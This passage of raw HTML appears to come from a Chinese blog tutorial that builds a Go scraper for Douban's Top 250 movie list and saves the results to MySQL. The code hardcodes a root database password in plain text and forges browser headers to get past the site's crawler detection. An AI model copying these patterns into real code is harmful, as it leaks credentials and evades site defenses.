punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"info"</span><span class="token punctuation">,</span>info<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"score"</span><span class="token punctuation">,</span>score<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"quote"</span><span class="token punctuation">,</span>quote<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="利用正则去区分不同内容"><a href="#利用正则去区分不同内容" class="headerlink" title="利用正则去区分不同内容"></a>利用正则去区分不同内容</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">infoSpite</span><span class="token punctuation">(</span>info <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>director <span class="token builtin">string</span><span class="token punctuation">,</span>actor <span class="token builtin">string</span><span class="token punctuation">,</span>year <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//directory</span>directoryRe <span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">Compile</span><span class="token punctuation">(</span><span class="token string">`导演:(.*)主演:`</span><span class="token punctuation">)</span>director <span class="token operator">=</span> <span class="token function">string</span><span class="token punctuation">(</span>directoryRe<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//actor</span>actorRe <span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">Compile</span><span class="token punctuation">(</span><span class="token string">`主演:(.*)`</span><span class="token punctuation">)</span>actor <span class="token operator">=</span> <span class="token function">string</span><span class="token punctuation">(</span>actorRe<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//year</span>yearRe<span class="token punctuation">,</span><span class="token boolean">_</span> <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">Compile</span><span class="token punctuation">(</span><span class="token string">`(\d+)`</span><span class="token punctuation">)</span>year <span class="token operator">=</span> <span class="token function">string</span><span class="token punctuation">(</span>yearRe<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="定义结构体去存储不同的信息"><a href="#定义结构体去存储不同的信息" class="headerlink" title="定义结构体去存储不同的信息"></a>定义结构体去存储不同的信息</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">//结构体的定义</span><span class="token keyword">type</span> MovieData <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>Title <span class="token builtin">string</span>Director <span class="token builtin">string</span>Picture <span class="token builtin">string</span>Actor <span class="token builtin">string</span>Year <span class="token builtin">string</span>Score <span class="token builtin">string</span>Quote <span class="token builtin">string</span><span class="token punctuation">&#125;</span><span class="token comment">//给不同的变量传参</span><span class="token keyword">if</span> ok <span class="token punctuation">&#123;</span>director<span class="token punctuation">,</span>actor<span class="token punctuation">,</span>year <span class="token operator">:=</span> <span class="token function">infoSpite</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span>data<span class="token punctuation">.</span>Title<span class="token operator">=</span>titledata<span class="token punctuation">.</span>Director<span class="token operator">=</span>directordata<span class="token punctuation">.</span>Picture<span class="token operator">=</span>imgTmpdata<span class="token punctuation">.</span>Actor<span class="token operator">=</span>actordata<span class="token punctuation">.</span>Year<span class="token operator">=</span>yeardata<span class="token punctuation">.</span>Score<span class="token operator">=</span>scoredata<span class="token punctuation">.</span>Quote<span class="token operator">=</span>quotefmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"data%v\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span> <span class="token comment">//打印一下检测是否正确存储</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="修改参数"><a href="#修改参数" class="headerlink" title="修改参数"></a>修改参数</h3><ol><li><p>每一页的传参是通过get传参，给start变量传参</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go">req<span class="token punctuation">,</span>err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">NewRequest</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token string">"https://movie.douban.com/top250?start="</span><span class="token operator">+</span>page<span class="token punctuation">,</span><span class="token boolean">nil</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="链接数据库"><a href="#链接数据库" class="headerlink" title="链接数据库"></a>链接数据库</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">//数据库初始化</span><span class="token keyword">func</span> <span class="token function">InitDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//链接数据库</span>DB <span class="token punctuation">,</span> err <span class="token operator">:=</span> sql<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"mysql"</span><span class="token punctuation">,</span>USERNAME <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> PASSWORD <span class="token operator">+</span> <span class="token string">"@tcp("</span> <span class="token operator">+</span> HOST <span class="token operator">+</span> <span class="token string">")/"</span> <span class="token operator">+</span> DBNAME<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token function">panic</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>DB<span class="token punctuation">.</span><span class="token function">SetConnMaxLifetime</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>DB<span class="token punctuation">.</span><span class="token function">SetMaxIdleConns</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">:=</span> DB<span class="token punctuation">.</span><span class="token function">Ping</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"open database fail"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"connect success"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>  连接数据库用来保存爬下来的数据</li></ol><h2 id="将爬下来的数据插入到数据库中，定义插入函数"><a href="#将爬下来的数据插入到数据库中，定义插入函数" class="headerlink" title="将爬下来的数据插入到数据库中，定义插入函数"></a>将爬下来的数据插入到数据库中，定义插入函数</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">//插入数据</span><span class="token keyword">func</span> <span class="token function">InsertData</span><span class="token punctuation">(</span>moviedata MovieData<span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span><span class="token comment">//新建事务</span>tx <span class="token punctuation">,</span> err <span class="token operator">:=</span> DB<span class="token punctuation">.</span><span class="token function">Begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"begin err"</span><span class="token punctuation">,</span>err<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span>stmt <span class="token punctuation">,</span> err <span class="token operator">:=</span> tx<span class="token punctuation">.</span><span class="token function">Prepare</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO movie_data(Title,Director,Picture,Actor,Year,Score,Quote) VALUES(?,?,?,?,?,?,?)"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"prepare fail err"</span><span class="token punctuation">,</span>err<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token boolean">_</span> <span class="token punctuation">,</span> err <span class="token operator">=</span>stmt<span class="token punctuation">.</span><span class="token function">Exec</span><span class="token punctuation">(</span>moviedata<span class="token punctuation">.</span>Title<span class="token punctuation">,</span>moviedata<span class="token punctuation">.</span>Director<span class="token punctuation">,</span>moviedata<span class="token punctuation">.</span>Picture<span class="token punctuation">,</span>moviedata<span class="token punctuation">.</span>Actor<span class="token punctuation">,</span>moviedata<span class="token punctuation">.</span>Year<span class="token punctuation">,</span>moviedata<span class="token punctuation">.</span>Score<span class="token punctuation">,</span>moviedata<span class="token punctuation">.</span>Quote<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"exec fail"</span><span class="token punctuation">,</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token boolean">_</span> <span class="token operator">=</span> tx<span class="token punctuation">.</span><span class="token function">Commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="综上，没有实现高并发的代码"><a href="#综上，没有实现高并发的代码" class="headerlink" title="综上，没有实现高并发的代码"></a>综上，没有实现高并发的代码</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"database/sql"</span><span class="token string">"fmt"</span><span class="token string">"net/http"</span><span class="token string">"regexp"</span><span class="token string">"strconv"</span><span class="token boolean">_</span> <span class="token string">"github.com/go-sql-driver/mysql"</span><span class="token string">"github.com/PuerkitoBio/goquery"</span><span class="token punctuation">)</span><span class="token comment">//数据库配置</span><span class="token keyword">const</span> <span class="token punctuation">(</span>USERNAME <span class="token operator">=</span> <span class="token string">"root"</span>PASSWORD <span class="token operator">=</span> <span class="token string">"20030729a"</span>HOST <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>PORT <span class="token operator">=</span> <span class="token string">"3306"</span>DBNAME <span class="token operator">=</span> <span class="token string">"movie"</span><span class="token punctuation">)</span><span class="token keyword">var</span> DB <span class="token operator">*</span>sql<span class="token punctuation">.</span>DB<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">InitDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i<span class="token operator">:=</span><span class="token number">0</span> <span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"正在爬取第%v页信息\n"</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token function">Spider</span><span class="token punctuation">(</span>strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">type</span> MovieData <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>Title <span class="token builtin">string</span>Director <span class="token builtin">string</span>Picture <span class="token builtin">string</span>Actor <span class="token builtin">string</span>Year <span class="token builtin">string</span>Score <span class="token builtin">string</span>Quote <span class="token builtin">string</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">Spider</span><span class="token punctuation">(</span>page <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//1. 发送请求</span><span class="token keyword">var</span> client http<span class="token punctuation">.</span>Client<span class="token keyword">var</span> data MovieDatareq<span class="token punctuation">,</span>err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">NewRequest</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token string">"https://movie.douban.com/top250?start="</span><span class="token operator">+</span>page<span class="token punctuation">,</span><span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"req.err"</span><span class="token punctuation">,</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">//防止浏览器检爬虫访问，所以加一些请求头伪造成浏览器访问</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Connection"</span><span class="token punctuation">,</span> <span class="token string">"keep-alive"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Pragma"</span><span class="token punctuation">,</span> <span class="token string">"no-cache"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Cache-Control"</span><span class="token punctuation">,</span> <span class="token string">"no-cache"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Upgrade-Insecure-Requests"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"User-Agent"</span><span class="token punctuation">,</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Accept"</span><span class="token punctuation">,</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Accept-Language"</span><span class="token punctuation">,</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">)</span>resp<span class="token punctuation">,</span>err <span class="token operator">:=</span> client<span class="token punctuation">.</span><span class="token function">Do</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"请求失败"</span><span class="token punctuation">,</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">defer</span> resp<span class="token punctuation">.</span>Body<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//2. 解析网页</span>docDetail <span class="token punctuation">,</span>err <span class="token operator">:=</span> goquery<span class="token punctuation">.</span><span class="token function">NewDocumentFromReader</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>Body<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"解析失败"</span><span class="token punctuation">,</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">//3. 获取节点信息,copy css selector</span><span class="token comment">//.grid_view > li:nth-child(1) > div:nth-child(1) > div:nth-child(2) > div:nth-child(1) > a:nth-child(1)</span><span class="token comment">//#content > div > div.article > ol > li:nth-child(1) > div > div.info > div.hd > a > span:nth-child(1)</span><span class="token comment">//.grid_view > li:nth-child(1) > div:nth-child(1) > div:nth-child(2) > div:nth-child(1) > a:nth-child(1)</span><span class="token comment">//.grid_view > li:nth-child(3)</span><span class="token comment">//.grid_view > li:nth-child(4)</span>docDetail<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"#content > div > div.article > ol > li > div"</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token comment">//列表</span><span class="token function">Each</span><span class="token punctuation">(</span><span class="token keyword">func</span><span class="token punctuation">(</span>i <span class="token builtin">int</span><span class="token punctuation">,</span>s <span class="token operator">*</span> goquery<span class="token punctuation">.</span>Selection<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//在列表里面继续找</span>title <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"div.info > div.hd > a > span:nth-child(1)"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>img <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"div.pic > a > img"</span><span class="token punctuation">)</span> <span class="token comment">//img标签 -》 src属性里面</span>imgTmp <span class="token punctuation">,</span> ok <span class="token operator">:=</span> img<span class="token punctuation">.</span><span class="token function">Attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">)</span>info <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"div.info > div.bd > p:nth-child(1)"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>score <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"div.info > div.bd > div > span.rating_num"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>quote <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"div.info > div.bd > p.quote > span"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//4. 保存信息</span><span class="token keyword">if</span> ok <span class="token punctuation">&#123;</span>director<span class="token punctuation">,</span>actor<span class="token punctuation">,</span>year <span class="token operator">:=</span> <span class="token function">infoSpite</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span>data<span class="token punctuation">.</span>Title<span class="token operator">=</span>titledata<span class="token punctuation">.</span>Director<span class="token operator">=</span>directordata<span class="token punctuation">.</span>Picture<span class="token operator">=</span>imgTmpdata<span class="token punctuation">.</span>Actor<span class="token operator">=</span>actordata<span class="token punctuation">.</span>Year<span class="token operator">=</span>yeardata<span class="token punctuation">.</span>Score<span class="token operator">=</span>scoredata<span class="token punctuation">.</span>Quote<span class="token operator">=</span>quote<span class="token keyword">if</span> <span class="token function">InsertData</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"插入成功"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"插入失败"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token comment">// fmt.Println("data%v\n",data)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">infoSpite</span><span class="token punctuation">(</span>info <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>director <span class="token builtin">string</span><span class="token punctuation">,</span>actor <span class="token builtin">string</span><span class="token punctuation">,</span>year <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//directory</span>directoryRe <span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">Compile</span><span class="token punctuation">(</span><span class="token string">`导演:(.*)主演:`</span><span class="token punctuation">)</span>director <span class="token operator">=</span> <span class="token function">string</span><span class="token punctuation">(</span>directoryRe<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//actor</span>actorRe <span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">Compile</span><span class="token punctuation">(</span><span class="token string">`主演:(.*)`</span><span class="token punctuation">)</span>actor <span class="token operator">=</span> <span class="token function">string</span><span class="token punctuation">(</span>actorRe<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//year</span>yearRe<span class="token punctuation">,</span><span class="token boolean">_</span> <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">Compile</span><span class="token punctuation">(</span><span class="token string">`(\d+)`</span><span class="token punctuation">)</span>year <span class="token operator">=</span> <span class="token function">string</span><span class="token punctuation">(</span>yearRe<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token comment">//数据库初始化</span><span class="token keyword">func</span> <span class="token function">InitDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//链接数据库</span>DB <span class="token punctuation">,</span> err <span class="token operator">:=</span> sql<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"mysql"</span><span class="token punctuation">,</span><span class="token string">"root:20030729a@tcp(localhost:3306)/movie"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token function">panic</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>DB<span class="token punctuation">.</span><span class="token function">SetConnMaxLifetime</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>DB<span class="token punctuation">.</span><span class="token function">SetMaxIdleConns</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">:=</span> DB<span class="token punctuation">.</span><span class="token function">Ping</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"open database fail"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"connect success"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">//插入数据</span><span class="token keyword">func</span> <span class="token function">InsertData</span><span class="token punctuation">(</span>moviedata MovieData<span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span><span class="token comment">//新建事务</span>tx <span class="token punctuation">,</span> err <span class="token operator">:=</span> DB<span class="token punctuation">.</span><span class="token function">Begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"begin err"</span><span class="token punctuation">,</span>err<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span>stmt <span class="token punctuation">,</span> err <span class="token operator">:=</span> tx<span class="token punctuation">.</span><span class="token function">Prepare</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO movie_data(Title,Director,Picture,Actor,Year,Score,Quote) VALUES(?,?,?,?,?,?,?)"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"prepare fail err"</span><span class="token punctuation">,</span>err<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token boolean">_</span> <span class="token punctuation">,</span> err <span class="token operator">=</span>stmt<span class="token punctuation">.</span><span class="token function">Exec</span><span class="token punctuation">(</span>moviedata<span class="token punctuation">.</span>Title<span class="token punctuation">,</span>moviedata<span class="token punctuation">.</span>Director<span class="token punctuation">,</span>moviedata<span class="token punctuation">.</span>Picture<span class="token punctuation">,</span>moviedata<span class="token punctuation">.</span>Actor<span class="token punctuation">,</span>moviedata<span class="token punctuation">.</span>Year<span class="token punctuation">,</span>moviedata<span class="token punctuation">.</span>Score<span class="token punctuation">,</span>moviedata<span class="token punctuation">.</span>Quote<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"exec fail"</span><span class="token punctuation">,</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token boolean">_</span> <span class="token operator">=</span> tx<span class="token punctuation">.</span><span class="token function">Commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></spa